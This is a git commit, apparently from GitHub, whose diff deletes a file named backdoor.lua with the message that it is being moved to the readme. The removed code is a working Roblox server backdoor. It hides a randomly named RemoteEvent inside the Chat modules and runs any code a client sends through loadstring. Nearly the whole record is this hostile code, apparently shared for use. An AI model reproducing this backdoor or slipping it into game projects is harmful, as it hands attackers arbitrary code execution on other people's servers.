41f2661352f71f7cb43c04cc866f838bcf255d1d
iK4oS <47014074+iK4oS@users.noreply.github.com>
2021-04-29 00:31:39 +0200

    Transfering this to the readme

--- backdoor.lua
+++
@@ -1,5 +0,0 @@
-local Remote = Instance.new("RemoteEvent", game.Chat:WaitForChild("ClientChatModules").MessageCreatorModules)
-Remote.Name = tostring(math.random(100000000,1000000000))
-Remote.OnServerEvent:connect(function(player, execute)
-	loadstring(execute)()
-end)
